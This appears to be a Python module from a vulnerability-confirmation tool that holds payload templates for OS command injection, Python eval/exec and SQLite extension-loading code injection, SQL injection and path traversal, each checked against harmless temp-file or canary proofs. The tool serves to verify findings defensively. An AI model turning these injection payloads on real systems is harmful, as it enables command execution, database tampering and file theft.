"""Per-CWE exploit strategies for VULCAN Tier-2.

Each strategy supplies, for one CWE:
  * a bank of attacker payload TEMPLATES (seeded from the public, well-known
    injection patterns catalogued in projects like PayloadsAllTheThings --
    these are the generic shapes, not secrets), each written against a
    per-attempt ProofContext via placeholder tokens, and
  * a deterministic verify() that checks for a REAL observable effect of the
    attack -- a file the attack created, a DB table an injected statement
    created, a write that escaped its directory. The sink merely firing is
    NOT enough; the observable must be present.

Placeholders substituted per attempt (see ProofContext.render):
  __PROOF__    an absolute path the attack should cause to be created/written
  __PROOFDB__  an absolute path an injected ATTACH DATABASE should create
  __SECRET__   an absolute path holding a planted canary (exfil targets)
  __CANARY__   the canary string planted in __SECRET__
  __NONCE__    a unique token to write/grep for
"""
from __future__ import annotations

import os
import shutil
import sqlite3
import subprocess
import tempfile
import uuid
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# Benign proof-of-concept SQLite loadable extension (for CWE-94 via
# load_extension). If attacker input controls the path passed to
# sqlite3.Connection.load_extension(), SQLite dlopen()s that file and calls its
# init function -- i.e. arbitrary native code execution. To PROVE that under
# execution we need a real extension to load. This one is deliberately
# harmless: its init reads the proof path from the environment variable
# TIER2_EXT_PROOF and writes a single sentinel file there, nothing else. That
# the sentinel appears proves native code from an attacker-chosen path ran.
# Compiled ONCE and cached; if no C compiler exists the CWE-94 extension probe
# is simply skipped (the eval/exec probes still run).
# ---------------------------------------------------------------------------
_PROOF_EXT = None  # None = untried, False = unavailable, str = compiled .so path

_PROOF_EXT_C = r'''
#include <stdio.h>
#include <stdlib.h>
static void tier2_do_proof(void){
    const char *p = getenv("TIER2_EXT_PROOF");
    if(!p || !*p) return;
    FILE *f = fopen(p, "w");
    if(f){ fputs("tier2-extension-loaded", f); fclose(f); }
}
/* legacy generic entry point */
int sqlite3_extension_init(void *db, char **e, const void *api){ tier2_do_proof(); return 0; }
/* basename-derived entry point for a file named proofext.so */
int sqlite3_proofext_init(void *db, char **e, const void *api){ tier2_do_proof(); return 0; }
'''


def _ensure_proof_extension():
    """Compile the benign PoC extension once; return its .so path or None."""
    global _PROOF_EXT
    if _PROOF_EXT is not None:
        return _PROOF_EXT or None
    cc = shutil.which("gcc") or shutil.which("cc") or shutil.which("clang")
    if not cc:
        _PROOF_EXT = False
        return None
    d = os.path.join(tempfile.gettempdir(), "vulcan_tier2_ext")
    os.makedirs(d, exist_ok=True)
    so = os.path.join(d, "proofext.so")
    src = os.path.join(d, "proofext.c")
    try:
        with open(src, "w") as fh:
            fh.write(_PROOF_EXT_C)
        r = subprocess.run([cc, "-shared", "-fPIC", "-o", so, src],
                           capture_output=True, text=True, timeout=60)
        if r.returncode == 0 and os.path.exists(so):
            _PROOF_EXT = so
            return so
    except Exception:  # noqa: BLE001
        pass
    _PROOF_EXT = False
    return None


@dataclass
class ProofContext:
    """A fresh, isolated set of proof artifacts for ONE exploit attempt.

    Everything lives under a unique temp dir with a unique nonce, so one
    attempt's observable can never be mistaken for another's, and a stale
    file from a previous payload can never cause a false CONFIRMED."""
    base: str
    nonce: str
    proof_file: str
    proof_db: str
    secret_file: str
    canary: str

    @classmethod
    def new(cls) -> "ProofContext":
        base = tempfile.mkdtemp(prefix="tier2_proof_")
        nonce = uuid.uuid4().hex[:12]
        canary = "CANARY_" + uuid.uuid4().hex[:16]
        return cls(
            base=base, nonce=nonce, canary=canary,
            proof_file=os.path.join(base, f"pwned_{nonce}"),
            proof_db=os.path.join(base, f"pwn_{nonce}.db"),
            secret_file=os.path.join(base, f"secret_{nonce}.txt"),
        )

    def render(self, template: str) -> str:
        return (template
                .replace("__PROOFDB__", self.proof_db)
                .replace("__PROOF__", self.proof_file)
                .replace("__SECRET__", self.secret_file)
                .replace("__CANARY__", self.canary)
                .replace("__NONCE__", self.nonce)
                .replace("__EXTSO__", _ensure_proof_extension() or "/nonexistent_tier2_proofext.so"))

    def cleanup(self) -> None:
        import shutil
        try:
            shutil.rmtree(self.base, ignore_errors=True)
        except OSError:
            pass


def _output_text(result) -> str:
    """Flatten a run_live_demo result's captured return value + stdout into one
    searchable string, for exploits that PROVE themselves by returning stolen
    data (read-only path traversal, UNION-style SQL injection) rather than by a
    side effect on disk. Empty when output capture is unavailable."""
    if not result:
        return ""
    return f"{result.get('return_repr') or ''}\n{result.get('stdout') or ''}"


@dataclass
class ExploitStrategy:
    cwe: str
    name: str
    goal: str                 # plain-English observable goal (also shown to the agent)
    templates: list           # payload templates (strings with placeholder tokens)

    def setup(self, ctx: ProofContext) -> None:
        """Plant anything the attack needs (e.g. a canary file). Default: none."""
        return None

    def verify(self, ctx: ProofContext, result: dict | None) -> tuple:
        """Return (confirmed: bool, proof_description: str). `result` is the
        run_live_demo output, carrying the captured return value / stdout."""
        raise NotImplementedError


# ---------------------------------------------------------------------------
# CWE-78 -- OS command injection. Observable: our injected shell command runs
# and creates the proof file.
# ---------------------------------------------------------------------------
class _CmdInjection(ExploitStrategy):
    def verify(self, ctx, result):
        if os.path.exists(ctx.proof_file):
            return True, f"injected shell command created {ctx.proof_file}"
        return False, ""


CWE78 = _CmdInjection(
    cwe="CWE-78", name="os-command-injection",
    goal="cause the program to execute an extra shell command that creates the file __PROOF__",
    templates=[
        "; touch __PROOF__",
        "&& touch __PROOF__",
        "| touch __PROOF__",
        "$(touch __PROOF__)",
        "`touch __PROOF__`",
        "; echo __NONCE__ > __PROOF__",
        "\ntouch __PROOF__\n",
        "x; touch __PROOF__ #",
        "'; touch __PROOF__; '",
        "\"; touch __PROOF__; \"",
    ],
)


# ---------------------------------------------------------------------------
# CWE-94 -- code injection (Python eval/exec of attacker input). Observable:
# our injected Python writes the proof file.
# ---------------------------------------------------------------------------
class _CodeInjection(ExploitStrategy):
    def setup(self, ctx):
        # The benign PoC extension's init writes the proof file named here, so
        # a successful load_extension(our .so) leaves an observable sentinel.
        os.environ["TIER2_EXT_PROOF"] = ctx.proof_file

    def verify(self, ctx, result):
        if os.path.exists(ctx.proof_file):
            return True, f"attacker-controlled code execution created {ctx.proof_file}"
        return False, ""


CWE94 = _CodeInjection(
    cwe="CWE-94", name="code-injection",
    goal=("cause attacker-controlled code to run and create the file __PROOF__ "
          "-- either by injecting Python into an eval/exec, or by passing the "
          "path of a loadable library to load_extension"),
    templates=[
        # (a) Python eval/exec injection
        "__import__('os').system('touch __PROOF__')",
        "open('__PROOF__','w').write('__NONCE__')",
        "[open('__PROOF__','w').write('__NONCE__')]",
        "(open('__PROOF__','w').write('__NONCE__'))",
        "'+open('__PROOF__','w').write('__NONCE__')+'",
        "';__import__('os').system('touch __PROOF__');'",
        "__import__('os').system('touch __PROOF__')#",
        # (b) arbitrary loadable-library execution: the path of our benign PoC
        # SQLite extension. If this param flows to load_extension(), SQLite
        # dlopen()s it and runs its init -> native code execution, proven by
        # the sentinel the extension writes.
        "__EXTSO__",
    ],
)


# ---------------------------------------------------------------------------
# CWE-89 -- SQL injection. Observable (side-effect proof, no output capture
# needed): an injected multi-statement ATTACHes a new database file and
# CREATEs a table in it. We then open that file and confirm the table exists.
# This proves a write-capable injection on sinks that reach executescript /
# multi-statement execution. (Pure single-statement UNION read-exfil would
# need the function's return value -- a documented v2 extension -- so those
# honestly come back NOT_CONFIRMED here rather than over-claimed.)
# ---------------------------------------------------------------------------
class _SqlInjection(ExploitStrategy):
    def verify(self, ctx, result):
        # (a) side-effect proof: injected ATTACH created a DB with table 'pwned'
        if os.path.exists(ctx.proof_db):
            try:
                con = sqlite3.connect(ctx.proof_db)
                row = con.execute(
                    "SELECT name FROM sqlite_master WHERE type='table' AND name='pwned'"
                ).fetchone()
                con.close()
                if row is not None:
                    return True, f"injected SQL ATTACHed {ctx.proof_db} and CREATEd table 'pwned'"
            except sqlite3.Error:
                pass
        # (b) output proof (needs output capture): a UNION / standalone SELECT
        # injection made the query return our attacker-chosen canary.
        if ctx.canary in _output_text(result):
            return True, f"injected SQL returned attacker-chosen canary {ctx.canary} in the query result"
        return False, ""


CWE89 = _SqlInjection(
    cwe="CWE-89", name="sql-injection",
    goal=("make the query do something attacker-chosen: either run an extra "
          "statement that ATTACHes DATABASE '__PROOFDB__' and CREATEs table "
          "pwn.pwned, or make it return the canary string __CANARY__"),
    templates=[
        # (a) multi-statement side-effect (reaches executescript-style sinks)
        "'); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "'; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        "x'); ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); -- ",
        "1; ATTACH DATABASE '__PROOFDB__' AS pwn; CREATE TABLE pwn.pwned(x); --",
        # (b) data-return exfil (needs output capture). A standalone SELECT for
        # sinks where the param IS the whole query; UNION variants (several
        # column counts) for sinks that splice the param into a SELECT.
        "SELECT '__CANARY__'",
        "' UNION SELECT '__CANARY__' -- ",
        "' UNION SELECT '__CANARY__',NULL -- ",
        "' UNION SELECT '__CANARY__',NULL,NULL -- ",
        "' UNION SELECT '__CANARY__',NULL,NULL,NULL -- ",
        "1' UNION SELECT '__CANARY__' -- ",
        "') UNION SELECT '__CANARY__' -- ",
    ],
)


# ---------------------------------------------------------------------------
# CWE-22 -- path traversal. Observable: a WRITE sink is steered to create our
# proof file OUTSIDE its intended directory. The strongest, base-dir-agnostic
# payload is an absolute path: Python's os.path.join(base, abs) and
# Path(base)/abs both discard `base` when the second component is absolute, so
# an absolute payload lands exactly where we choose. Classic ../ ladders are
# included as fallbacks. (Read-only traversal that merely returns file
# contents needs output capture -- v2 -- so it honestly stays NOT_CONFIRMED.)
# ---------------------------------------------------------------------------
class _PathTraversal(ExploitStrategy):
    def setup(self, ctx):
        # plant a canary in case a future read-exfil verifier wants it; the
        # write-escape proof below does not depend on it.
        try:
            with open(ctx.secret_file, "w") as fh:
                fh.write(ctx.canary)
        except OSError:
            pass

    def verify(self, ctx, result):
        # (a) write-escape proof: a write landed at our out-of-tree path
        if os.path.exists(ctx.proof_file):
            return True, f"traversal write escaped to {ctx.proof_file}"
        # (b) read-exfil proof (needs output capture): a read returned the
        # canary we planted in a file outside the intended directory.
        if ctx.canary in _output_text(result):
            return True, f"traversal read exfiltrated the planted canary from {ctx.secret_file}"
        return False, ""


CWE22 = _PathTraversal(
    cwe="CWE-22", name="path-traversal",
    goal=("either steer a file WRITE to the absolute path __PROOF__ (outside the "
          "intended directory), or steer a file READ to __SECRET__ so its "
          "contents (the canary __CANARY__) are returned"),
    templates=[
        # (a) write-escape: absolute-path override lands our file out of tree
        "__PROOF__",
        # (b) read-exfil: absolute path to our planted canary file -> its
        # contents come back in the function's return value / stdout
        "__SECRET__",
        # classic traversal ladders (fallbacks for relative-join sinks)
        "../../../../../../../../../../.." + os.sep,
        "....//....//....//....//....//....//",
        "..%2f..%2f..%2f..%2f..%2f..%2f",
    ],
)


STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22)}
